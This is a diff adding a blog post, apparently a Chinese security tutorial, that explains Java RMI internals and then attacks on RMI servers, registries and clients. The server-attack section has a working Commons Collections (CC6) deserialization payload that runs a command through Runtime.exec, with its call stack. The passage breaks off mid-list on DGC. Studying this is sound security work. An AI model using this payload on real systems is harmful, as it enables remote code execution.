@@ -1,0 +1,706 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>RMI实现及攻击方式 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="RMI实现及攻击方式 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="介绍
+RMI(Remote Method Invocation)远程方法调用，顾名思义，可以让一个JVM调用另一个JVM的远程类(实现java.rmi.Remote接口的类)的方法。
+其具体的实现思想就是让我们获取远程主机的对象引用，我们调..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              RMI实现及攻击方式
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-06-12
+              </span>
+              <span>
+                26 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="介绍">介绍</h1>
+<p>RMI(Remote Method Invocation)远程方法调用，顾名思义，可以让一个JVM调用另一个JVM的远程类(实现java.rmi.Remote接口的类)的方法。<br>
+其具体的实现思想就是让我们获取远程主机的对象引用，我们调用这个引用对象时，方法的执行在远程位置上执行。<br>
+为了屏蔽网络通信的复杂性，RMI引入了两个概念，分别是Stubs(客户端存根)以及Skeletons(服务端骨架)，当客户端视图调用一个远程对象时，实际调用的客户端本地的一个代理类(Proxy)，这个代理类就称为Stub，而在调用服务端的目标类之前，也会经过一个对应的服务端代理类，就是Skeleton，它从Stub中接收远程方法调用并传递给真实的目标类。Stubs以及Skeletons的调用对于RMI服务的使用者是隐藏的，我们无需主动的去调用相关方法。但实际的客户端和服务端的玩过通信时通过Stub和Skeleton来实现的。<br>
+而在使用RMI之前，我们需要把被调用的类，注册到一个叫做RMI Registry的地方，只有把类注册到这个地方，调用者就能通过RMI Registry找到类所在JVM的ip和port，才能跨越JVM完成远程方法的调用。<br>
+调用者，我们称之为客户端，被调用者，我们则称之为服务端。<br>
+调用时序图：<br>
+<img src="https://1jzz.github.io/post-images/1655040732948.png" alt="" loading="lazy"><br>
+使用RMI进行通信时，首先要定义一个我们期望能够远程调用的接口，这个接口必须扩展<code>java.rmi.Remote</code>接口，用来远程调用的对象需要实现这个接口。这个接口中的所有方法都必须声明抛出<code>java.rmi.RemoteException</code>异常，例如：</p>
+<pre><code class="language-java">public interface IRemoteHelloWorld extends Remote {
+        public String hello() throws RemoteException;
+}
+</code></pre>
+<p>其次我们来创建这个远程接口的实现类，这个类中是真正的执行逻辑代码，并且通常会继承<code>java.rmi.server.UnicastRemoteObject</code>类，继承此类之后，还需要提供一个构造函数并且抛出RemoteException。例如：</p>
+<pre><code class="language-java">public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {
+    protected RemoteHelloWorld() throws RemoteException {
+        super();
+    }
+
+    public String hello() throws RemoteException {
+        System.out.println(&quot;call from &quot;);
+        return &quot;Hello world&quot;;
+    }
+}
+</code></pre>
+<p>现在，一个可以被远程调用的对象就创建好了，接下来要如何调用呢？创建的远程对象需要在注册中心进行注册(Registry)，这样客户端就可以访问到注册中心(Registry)所存储的远程对象的存根。<br>
+当客户端可以访问到注册中心之后，需要获取指定名称的远程对象的存根。那这个过程是如何实现的呢？通过<code>java.rmi.Naming</code>这个类，它是被final所修饰的，提供了远程对象在注册中心(Registry)中存储和获取远程对象存根的方法(bind、rebind)，以<code>rmi://host:port/name</code>的形式进行绑定。</p>
+<pre><code class="language-java">RemoteHelloWorld h = new RemoteHelloWorld();
+LocateRegistry.createRegistry(1099);
+Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);
+</code></pre>
+<ol>
+<li>host表示注册表服务的ip地址</li>
+<li>port表示注册表服务所绑定的端口</li>
+<li>name表示一个注册远程引用对象的名称</li>
+</ol>
+<p>Naming提供了查询(lookup)、绑定(bind)、重新绑定(rebind)、解除绑定(unbind)、列出所有绑定的name(list)。<br>
+注册中心(Registry)的<code>java.rmi.registry.Registry</code>接口在rmi包下有两个直接实现类，分别是RegistryImpl_Stub和RegistryImpl这两个类。<br>
+我们通常使用<code>LocateRegistry#createRegistry()</code>这个方法来创建注册中心，然后将待用的类进行绑定，接着客户端就可以进行调用了：</p>
+<pre><code class="language-java">public class RMIClient {
+    public void lookup() throws Exception {
+        RMIServer.IRemoteHelloWorld r = (RMIServer.IRemoteHelloWorld) Naming.lookup(&quot;rmi://127.0.0.1:1099/Hello&quot;);
+        String test = r.hello();
+        System.out.println(test);
+
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RMIClient().lookup();
+    }
+}
+
+</code></pre>
+<p>或者：</p>
+<pre><code class="language-java">public void lookup1() throws Exception{
+    Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);
+
+    System.out.println(registry.list()[0]);
+
+    //lookup and call
+    RMIServer.IRemoteHelloWorld stub = (RMIServer.IRemoteHelloWorld) registry.lookup(&quot;Hello&quot;);
+    System.out.println(stub.hello());
+}
+</code></pre>
+<p>输出结果：<br>
+<img src="https://1jzz.github.io/post-images/1655040742951.png" alt="" loading="lazy"><br>
+这里的<br>
+<code>RMIServer.IRemoteHelloWorld</code>就是我们远程对象的接口，服务端和客户端都应存在一个这样的接口。<br>
+这样一次简单的远程调用通信就完成了，但这其中还有几个特性需要说一下。<br>
+首先时动态类加载，如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端是不存在的，则在服务端会抛出ClassNotFound的异常，但是RMI支持动态类加载，如果设置了<code>java.rmi.server.codebase</code>，则会尝试从其中的地址获取<code>.class</code>并加载及反序列化。<br>
+可使用<code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:8080/&quot;);</code>进行设置，或者使用参数-<code>Djava.rmi.server.codebase=&quot;http://127.0.0.1:8080/&quot;</code>进行指定。<br>
+接下来就是安全策略的设置，因为我们通过网络加载外部类并执行方法，所以我们要有一个安全管理器来进行设置，如果没有设置安全管理，RMI就不会动态加载任何类。<br>
+管理器应与管理策略相辅相成，所以我们还需要提供一个策略文件，里面配置允许那些主机进行哪些操作，这里为了方便测试，直接设置全部权限：</p>
+<pre><code>grant {
+  permission java.security.AllPermission;
+};
+</code></pre>
+<p>同样可以使用<code>-Djava.security.policy=rmi.policy</code>或<code>System.setProperty(&quot;java.security.policy&quot;, RMIClient.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code>来进行设置。<br>
+设置完毕之后，RMI服务端就可以进行动态类加载了。</p>
+<pre><code class="language-java">System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:8080/&quot;);
+System.setProperty(&quot;java.security.policy&quot;, RMIClient.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());
+if (System.getSecurityManager() == null) {
+    System.setSecurityManager(new SecurityManager());
+}
+</code></pre>
+<p><img src="https://1jzz.github.io/post-images/1655040749638.png" alt="" loading="lazy"><br>
+执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1655040754342.png" alt="" loading="lazy"></p>
+<h1 id="代码分析">代码分析</h1>
+<p>了解了RMI的简单流程之后，接下来具体看一下是如何实现的。</p>
+<h2 id="服务注册">服务注册</h2>
+<h3 id="远程对象创建">远程对象创建</h3>
+<p>首先我们创建了一个远程对象：<code>RemoteHelloWorld h = new RemoteHelloWorld();</code>，这个远程对象继承了UnicastRemoteObject类，这个类用于JRMP协议export远程对象，并获取与远程对象进行通信的Stub。</p>
+<ol>
+<li><code>new RemoteHelloWorld()</code>：调用了RemoteHelloWorld以及父类UnicastRemoteObject的构造函数</li>
+<li><code>UnicastRemoteObject#UnicastRemoteObject()</code>：初始化属性port为0，并且接着调用UnicastRemoteObject构造函数，在这个构造函数中会调用exportObject方法</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://1jzz.github.io/post-images/1655040761403.png" alt="" loading="lazy"></figure>
+<ol start="3">
+<li><code>UnicastRemoteObject#exportObject(Remote obj, int port)</code>：将传入的参数port传递给UnicastServerRef的构造方法进行实例化</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://1jzz.github.io/post-images/1655040765675.png" alt="" loading="lazy"></figure>
+<ol start="4">
+<li><code>UnicastRemoteObject#exportObject(Remote obj, UnicastServerRef sref)</code>：判断传入的obj对象是否为UnicastRemoteObject的子类，如果是的话则将obj对象转为UnicastRemoteObject对象，并且将传入的sref对象赋值给obj的ref属性，最后继续调用exportObject重载方法</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://1jzz.github.io/post-images/1655040771458.png" alt="" loading="lazy"></figure>
+<ol start="5">
+<li><code>UnicastRemoteObject#exportObject(Remote impl, Object data, boolean permanent)</code>：调用了<code>Util.createProxy(implClass, getClientRef(), forceStubUse)</code>创建Proxy</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://1jzz.github.io/post-images/1655040776758.png" alt="" loading="lazy"></figure>
+<ol start="6">
+<li><code>Util#createProxy()</code>：使用<code>RemoteObjectInvocationHandler</code>为我们的IRemoteHelloWorld接口中定义的方法创建动态代理。</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://1jzz.github.io/post-images/1655040781675.png" alt="" loading="lazy"></figure>
+<ol start="7">
+<li>继续回到<code>UnicastRemoteObject#exportObject()</code>方法，然后new了一个Target对象，对我们创建的stub(代理对象)进行封装，接着调用了<code>LiveRef#exportObject()</code>方法</li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://1jzz.github.io/post-images/1655040896860.png" alt="" loading="lazy"></figure>
+<ol start="8">
+<li>经过<code>LiveRef#exportObject()</code>方法中来到了<code>TCPTransport#exportObject()</code>方法中：调用了listen方法对本地端口进行监听，接着调用了其父类Transport的exportObject方法，然后将Target对象逐项注册到ObjectTable中。ObjectTable用来管理所有发布的Target实例，ObjectTable提供了根据ObjectEndpoint和Remote实例两种方式查找Target的方法(参数列表不同)。</li>
+</ol>
+<p><img src="https://1jzz.github.io/post-images/1655040918388.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1655040924084.png" alt="" loading="lazy"><br>
+流程图：<br>
+<img src="https://1jzz.github.io/post-images/1655040930090.png" alt="" loading="lazy"><br>
+首先来看一下RemoteObjectInvocationHandler这个动态代理，继承了RemoteObject并且实现了InvocationHandler。因此这是一个可序列化、可使用RMI远程传输的动态代理类。既然是动态代理类，自然重点关注invoke方法，可以看到如果Method对象的clazz为Object对象的话就会调用invokeRemoteMethod方法，其他对象则会调用invokeRemoteMethod方法。<br>
+<img src="https://1jzz.github.io/post-images/1655040936991.png" alt="" loading="lazy"><br>
+接下来的话我们跟进以下invokeRemoteMethod方法：可以看到在invokeRemoteMethod方法中实际上是委托给RemoteRef的子类UnicastRef的invoke方法。<br>
+<img src="https://1jzz.github.io/post-images/1655040943195.png" alt="" loading="lazy"><br>
+UnicastRef的invoke方法是一个建立连接、执行调用、读取结果并反序列化的过程。这里，UnicastRef中的的LiveRef对象包含了Channel、Endpoint属性，<br>
+<img src="https://1jzz.github.io/post-images/1655040950047.png" alt="" loading="lazy"><br>
+反序列化的执行在unmarshalValue方法中。<br>
+<img src="https://1jzz.github.io/post-images/1655040956715.png" alt="" loading="lazy"></p>
+<h3 id="注册中心创建">注册中心创建</h3>
+<p>在代码中，我们通常使用<code>LocateRegistry.createRegistry(1099);</code>来创建注册中心，那么这个过程中又执行了什么呢？我们可以跟进查看。<br>
+通过调用createRegistry方法实际上只是实例化了一个RegistryImpl对象。<br>
+![image.png]<img src="https://1jzz.github.io/post-images/1655040963871.png" alt="" loading="lazy"><br>
+RegistryImpl类的构造函数首先对端口号(1099)和是否存在SecurityManger进行一个判断。<br>
+<img src="https://1jzz.github.io/post-images/1655040973357.png" alt="" loading="lazy"><br>
+接着实例化LiveRef以及UnicastServerRef，并调用setup方法调用了UnicastServerRef的exportObject方法将RegistryImpl这个对象生成Stub，如果需要创建代理的类在本地有<code>_Stub</code> 的类，则直接使用 createStub 方法反射调用 stub 类的构造方法创建类实例。<br>
+(实例化RegistryImpl_Stub，传入了UnicastRef对象作为构造函数参数,负责写入和序列化对象)。<br>
+<img src="https://1jzz.github.io/post-images/1655040979974.png" alt="" loading="lazy"><br>
+RegistryImpl_Stub类继承了RemoteStub，实现了Registry接口。这个类实现了bind/list/lookup/rebind/unbind等Registry接口中定义的方法，全部是通过反序列化来实现的。<br>
+<img src="https://1jzz.github.io/post-images/1655040986758.png" alt="" loading="lazy"><br>
+创建完代理类之后，会调用setSkeleton方法，再调用<code>Util.createSkeleton</code>方法来创建Skeleton。<br>
+<img src="https://1jzz.github.io/post-images/1655040993049.png" alt="" loading="lazy"><br>
+通过反射实例化<code>sun.rmi.registry.RegistryImpl_Skel</code>类实例，return赋值给UnicastServerRef对象的skel属性,负责读取和反序列化对象。<br>
+<img src="https://1jzz.github.io/post-images/1655041000357.png" alt="" loading="lazy"><br>
+注册中心与远程对象注册的大部分流程相同，差异在：</p>
+<ul>
+<li>远程对象使用动态代理，通过handler最终调用了<code>UnicastRef#invoke()</code>方法进行处理(读取、反序列化);注册中心实例化RegistryImpl_Stub来生成动态处理，同时还实例化了RegistryImpl_Skel对象</li>
+</ul>
+<h3 id="远程对象绑定">远程对象绑定</h3>
+<p>将远程对象bind到注册中心的过程。通常情况下，如果服务端和注册中心在同一端，我们可以直接调用Registry的bind方法进行绑定远程对象，其具体实现在RegistryImpl的bind方法，就是将Remote对象和名称(name)put到RegistryImpl对象的bindings属性(Hashtable对象)中。<br>
+<img src="https://1jzz.github.io/post-images/1655041009484.png" alt="" loading="lazy"><br>
+如果服务端和注册中心不在一起的话，那我们需要先获取Registry对象，无论是使用Naming或者LocateRegistry，都是调用<code>LocateRegistry.getRegistry()</code>方法来获取Registry。<br>
+<img src="https://1jzz.github.io/post-images/1655041015015.png" alt="" loading="lazy"><br>
+在<code>LocateRegistry.getRegistry()</code>方法中调用<code>Util.createProxy()</code>方法。通过调用stubClassExists方法判断是否存在类名加上_Stub的类，我们传入的Class为RegistryImpl，而RegistryImpl_Stub类是存在的，所以执行<code>createStub()</code>方法。<br>
+<img src="https://1jzz.github.io/post-images/1655041021223.png" alt="" loading="lazy"><br>
+<code>Util#createStub()</code>方法直接通过反射来获取RegistryImpl_Stub类的构造函数并且进行实例化。<br>
+<img src="https://1jzz.github.io/post-images/1655041026906.png" alt="" loading="lazy"><br>
+最后我们就得到了一个RegistryImpl_Stub对象：<br>
+<img src="https://1jzz.github.io/post-images/1655041032469.png" alt="" loading="lazy"><br>
+在获取了RegistryImpl_Stub对象之后，就可以通过其bind方法来绑定一个远程对象(最终都是调用<code>RegistryImpl_Stub#bind()</code>方法)：这个方法将其name以及其实例化对象(Remote实现类)，调用了ref属性的newCall方法(<code>UnicastRef#newCall()</code>)建立连接，最后返回一个StreamRemoteCall对象，然后writeObject。最后通过<code>UnicastRef#invoke()</code>方法发送。<br>
+<img src="https://1jzz.github.io/post-images/1655041037507.png" alt="" loading="lazy"><br>
+也就是说在服务端，我们调用了<code>RegistryImpl_Stub#bind()</code>方法向注册中心绑定一个远程对象的过程就是先与其建立连接，然后将name和远程对象写入最后通过<code>UnicastRef#invoke()</code>方法发送。<br>
+那么Registry端是怎么接收消息的呢？<br>
+在Registry端，由<code>sun.rmi.transport.tcp.TCPTransport#handleMessages()</code>方法中的<code>serviceCall()</code>方法来处理。<br>
+<img src="https://1jzz.github.io/post-images/1655041042962.png" alt="" loading="lazy"><br>
+<code>serviceCall()</code>方法从ObjectTabke中获取封装的Target对象，并获取其中封装的RegistryImpl对象以及UnicastServerRef对象。<br>
+<img src="https://1jzz.github.io/post-images/1655041048872.png" alt="" loading="lazy"><br>
+接着调用了<code>UnicastServerRef#dispatch()</code>方法，紧接着又调用了<code>UnicastServerRef#olddispatch()</code>方法，这里对this.skel是否为null进行判断，用来区别是注册中心还是服务端，注册中心存在该实例来进行读取和反序列化，而服务端只需要进行写入和序列化即可。<br>
+<img src="https://1jzz.github.io/post-images/1655041054891.png" alt="" loading="lazy"><br>
+<code>UnicastServerRef#olddispatch()</code>方法调用了<code>RegistryImpl_Skel#dispatch()</code>方法。<br>
+<img src="https://1jzz.github.io/post-images/1655041060984.png" alt="" loading="lazy"><br>
+<code>RegistryImpl_Skel#dispatch()</code>方法根据流中写入的不同的操作类型分发给不同的方法处理，例如1代表list方法，则从流中读取对应的内容，反序列化，然后调用<code>RegistryImpl#list()</code>方法。绑定远程对象读取的话值为0，则会调用<code>RegistryImpl#bind()</code>方法，最后调用writeObject方法将结果写入流中。<br>
+<img src="https://1jzz.github.io/post-images/1655041068809.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1655041074425.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1655041079658.png" alt="" loading="lazy"><br>
+以上就是服务端向注册中心注册远程对象的整个流程。</p>
+<h3 id="远程对象调用">远程对象调用</h3>
+<p>之后就是客户端向注册中心查询和请求的过程了。客户端获取注册中心的流程在上一部分已经说过了，是通过创建一个RegistryImpl_Stub对象并且向注册中心发起请求(newCall)。<br>
+在调用lookup方法时，会向注册中心传递序列化的name，然后将注册中心返回的结果反序列化。<br>
+<img src="https://1jzz.github.io/post-images/1655041084773.png" alt="" loading="lazy"><br>
+我我们还是需要查看注册中心是如何处理消息的。前面的流程还是一样的：</p>
+<ol>
+<li>TCPTransport#handleMessages()</li>
+<li>TCPTransport#serviceCall()</li>
+<li>UnicastServerRef#dispatch()</li>
+<li>UnicastServerRef#oldDispatch()</li>
+<li>RegistryImpl_Skel#dispatch()</li>
+</ol>
+<p>lookup方法对应的值是2，调用<code>RegistryImpl#lookup()</code>方法，然后将查询到的结果writeObject到流中。<br>
+<img src="https://1jzz.github.io/post-images/1655041091189.png" alt="" loading="lazy"><br>
+在<code>RegistryImpl#lookup()</code>方法中从bindings属性中获取了key为Hello的远程对象，这些远程对象都是经过<code>RemoteObjectInvocationHandler</code>这个handler进行代理的。最终返回了这个远程对象，并且writeObject到流中发送给客户端。<br>
+<img src="https://1jzz.github.io/post-images/1655041096997.png" alt="" loading="lazy"><br>
+客户端拿到注册中心返回的动态代理对象并且反序列化(readObject)后，就可以调用这个动态代理的方法了。通过代理的方式执行方法(<code>RemoteObjectInvocationHandler#invoke()</code>-&gt;<code>invokeRemoteMethod()</code>-&gt;<code>UnicastRef#invoke()</code>)。<br>
+此时客户端调用StreamRemoteCall()方法发送Call，其中var4是客户端想要调用的方法的哈希值。<br>
+<img src="https://1jzz.github.io/post-images/1655041102601.png" alt="" loading="lazy"><br>
+客户端接收到方法哈希值之后对该哈希值进行验证，是否存在方法，如果存在的话就先获取其参数值反射调用该方法并且返回结果(经过序列化)。<br>
+<img src="https://1jzz.github.io/post-images/1655041108473.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1655041113816.png" alt="" loading="lazy"><br>
+与服务端建立连接之后，unmarshalValue()方法根据返回值的类型，从而进行反序列化，读取返回的结果。<br>
+<img src="https://1jzz.github.io/post-images/1655041118473.png" alt="" loading="lazy"></p>
+<h2 id="小结">小结</h2>
+<p>RMI底层通讯采用了Stub和Skeleton机制：</p>
+<ul>
+<li>Stub：绑定在服务端的动态代理对象，客户端通过序列化传输name来获取相对应的远程对象</li>
+<li>Skeleton：客户端获取了注册中心之后，调用其实现Registry接口的方法之后，进行序列化发送到Skeleton中，调用dispatch方法进行处理(RegistryImpl对象从封装的Target中获取)</li>
+</ul>
+<p>其大致流程为：</p>
+<ol>
+<li>客户端获取注册中心调用<code>LocateRegistry.getRegistry()</code>方法实例化一个RegistryImpl_Stub对象</li>
+<li>客户端调用RegistryImpl_Stub的lookup等方法将会通过RemoteRef发起RemoteCall，并且将参数(如果有)序列化writeObject流中，最后建立起Socket连接</li>
+<li>服务端收到RemoteCall，在<code>RegistryImpl_Skel#dispatch()</code>中进行处理，通过调用之前export的Target对象并从中获取RegistryImpl_Stub对象并且执行相对应的方法(lookup)</li>
+<li>服务端通过读取服务端传来的name参数，在RegistryImpl中的bindings属性中进行查找，并返回经过动态代理的远程对象</li>
+<li>客户端获取到服务端的传来的经过动态代理的远程对象，调用其任意方法时会调用handler的invoke方法也就是执行<code>RemoteObjectInvocationHandler#invoke()</code>方法</li>
+<li>服务端首先判断该方法是否存在(通过哈希)，然后反序列化其参数，最后反射执行该方法，最终将执行完的结果经过序列化之后发送给客户端</li>
+<li>客户端接收到结果，反序列化之后得到结果，释放连接，返回结果</li>
+</ol>
+<h1 id="攻击rmi">攻击RMI</h1>
+<p>RMI中有三个角色：服务端、注册中心、客户端。注册中心负责远程对象的绑定以及查询，真正执行方法是在服务端，而客户端进行使用。通常情况下，服务端和注册中心是在同一端。<br>
+在上面的 RMI 调用过程中我们可以发现，全部的通信流程均通过反序列化实现，而且在三个角色中均进行了反序列化的操作。那也就说明针对三端都有攻击的可能，我们依次来看一下。</p>
+<h2 id="攻击服务端">攻击服务端</h2>
+<p>在客户端本地创建Stub之后，会将参数序列化然后写入并向服务端发送RemoteCall，服务端收到之后会反序列化参数，并且调用相应的方法，如果这个参数是Object类型的情况下，客户端可以传给服务端任意的类，直接造成反序列化漏洞。<br>
+例如，远程对象RemoteHelloWorld存在一个方法需要传入Object对象。</p>
+<pre><code class="language-java">public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld {
+    protected RemoteHelloWorld() throws RemoteException {
+        super();
+    }
+
+    public String hello() throws RemoteException {
+        System.out.println(&quot;call from &quot;);
+        return &quot;Hello world&quot;;
+    }
+
+    @Override
+    public String test(Object obj) throws RemoteException {
+        return obj.getClass().getName();
+    }
+}
+</code></pre>
+<p>那我们就可以直接传一个反序列化payload进去执行，这里就传入一个CC6payload进行尝试。</p>
+<pre><code class="language-java">public class RMIClient implements Serializable {
+
+    public void lookup() throws Exception {
+        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);
+        //System.out.println(Arrays.toString(registry.list()));
+        RMIServer.IRemoteHelloWorld stub = (RMIServer.IRemoteHelloWorld) registry.lookup(&quot;Hello&quot;);
+
+        System.out.println(stub.test(getExploitObject()));
+        //System.out.println(stub.hello());
+    }
+
+    public static Object getExploitObject() throws Exception{
+        Transformer[] faketransformers = new Transformer[] {};
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,
+                        new Class[]{String.class, Class[].class}, new Object[] {&quot;getRuntime&quot;, null}),
+                new InvokerTransformer(&quot;invoke&quot;,
+                        new Class[] {Object.class, Object[].class}, new Object[] {null, null}),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class}, new Object[]{&quot;calc&quot;})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformers);
+        Map map1 = LazyMap.decorate(new HashMap(), chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(map1, &quot;1jzz&quot;);
+        Map map = new HashMap();
+        map.put(tiedMapEntry, 1);
+        map1.clear();
+
+        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
+        field.setAccessible(true);
+        field.set(chainedTransformer, transformers);
+
+        return map;
+    }
+
+    public static void main(String[] args) throws Exception {
+        new RMIClient().lookup();
+        //Object exploit = getExploitObject();
+    }
+}
+</code></pre>
+<p>调用栈：</p>
+<pre><code class="language-java">exec:450, Runtime (java.lang)
+exec:347, Runtime (java.lang)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+transform:126, InvokerTransformer (org.apache.commons.collections.functors)
+transform:123, ChainedTransformer (org.apache.commons.collections.functors)
+get:158, LazyMap (org.apache.commons.collections.map)
+getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
+hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
+hash:338, HashMap (java.util)
+readObject:1397, HashMap (java.util)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+invokeReadObject:1058, ObjectStreamClass (java.io)
+readSerialData:1900, ObjectInputStream (java.io)
+readOrdinaryObject:1801, ObjectInputStream (java.io)
+readObject0:1351, ObjectInputStream (java.io)
+readObject:371, ObjectInputStream (java.io)
+unmarshalValue:326, UnicastRef (sun.rmi.server)
+dispatch:308, UnicastServerRef (sun.rmi.server)
+run:200, Transport$1 (sun.rmi.transport)
+run:197, Transport$1 (sun.rmi.transport)
+doPrivileged:-1, AccessController (java.security)
+serviceCall:196, Transport (sun.rmi.transport)
+handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
+run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+run:-1, 759294933 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)
+doPrivileged:-1, AccessController (java.security)
+run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
+runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
+run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
+run:745, Thread (java.lang)
+</code></pre>
+<h2 id="攻击注册中心">攻击注册中心</h2>
+<p>在使用注册中心时，首先服务端向注册中心绑定远程对象，这个对象是服务端生成的动态代理类，注册中心会反序列化这个类并保存在RegistryImpl的bindings属性中，以供lookup查找到该name的远程对象。所以如果我们是一个恶意的服务端，向注册中心输送了一个恶意对象，在其反序列化时就可以触发恶意代码。<br>
+这里依旧是使用CC6进行攻击，但是因为远程对象需要继承了remote类，所以说需要使用AnnotationInvocationHandler来代理Remote接口，形成了反序列化漏洞。<br>
+但是AnnotationInvocationHandler类遭受了JEP290的拦截：<br>
+<img src="https://1jzz.github.io/post-images/1655041129298.png" alt="" loading="lazy"><br>
+这与JDK的版本有关，在后面对JEP290进行介绍。<br>
+<img src="https://1jzz.github.io/post-images/1655041134264.png" alt="" loading="lazy"></p>
+<h2 id="攻击客户端">攻击客户端</h2>
+<p>如果攻击的目标为客户端，也就是注册中心的地址可控。客户端主要有两个交互行为，第一个是从注册中心获取</p>
+<h3 id="通过lookup方法获取远程代理对象时的反序列化操作">通过lookup方法获取远程代理对象时的反序列化操作</h3>
+<p>客户端在服务端lookup之后拿到一个服务端注册在注册中心的代理对象，并经过反序列化，我们可以将代理对象修改成一个恶意类。</p>
+<h3 id="通过调用动态代理对象但是传入或者返回一个恶意类">通过调用动态代理对象，但是传入或者返回一个恶意类</h3>
+<p>客户端通过代理类调用服务端的方法，并且传入了参数，如果该方法的哈希存在，则服务端会反射调用该方法，并且将结果经过序列化返回给客户端。可以将这个返回值修改为一个恶意类。</p>
+<h3 id="动态类加载">动态类加载</h3>
+<p>客户端lookup一个远程对象，但是返回一个客户端不存在的类，要求客户端去指定的codebase地址远程加载恶意类。(也就是RMI Reference)</p>
+<h3 id="攻击dgc">攻击DGC</h3>
+<p>在之前的调试过程中，也看到过和DGC相关的代码，那DGC是什么呢？<br>
+DGC(Distributed Garbage Collection)——分布式垃圾回收，当服务端返回一个远程对象到客户端时，DGC会跟踪对象在客户端的使用。当没有更多的对客户端远程对象的引用时或者引用&quot;过期&quot;，服务端将回收远程对象。启动一个RMI服务，就会伴随着DGC服务端的启动。<br>
+RMI定义了<code>java.rmi.dgc.DGC</code>接口，提供了两个方法dirty和clean:</p>
+<ul>
+<li>dirty：其中包含客户端的唯一VM标识符(VMID)和请求的租约期限，如果远程对象&quot;到期&quot;需要续订租约</li>
+<li>clean：清除客户端的远程对象(删除vmid)</li>
+</ul>
+<p>这个接口有两个实现类，分别是<code>sun.rmi.transport.DGCImpl</code>以及<code>sun.rmi.transport.DGCImpl_Stub</code>同时还定义了<code>sun.rmi.transportDGCImpl_Skel</code>。<br>
+这样的命名方式很像Registry、RegistryImpl、RegistryImpl_Stub、Registry_Skel。其处理逻辑是：</p>
+<ol>
+<li>创建注册中心时，实例化DGCImpl对象</li>
+<li>调用<code>DGCImpl#putTarget()</code>方法添加DGCImpl_Stub实例化对象</li>
+<li>客户端实例化DGCImpl_Stub对象，向服务端发起连接</li>
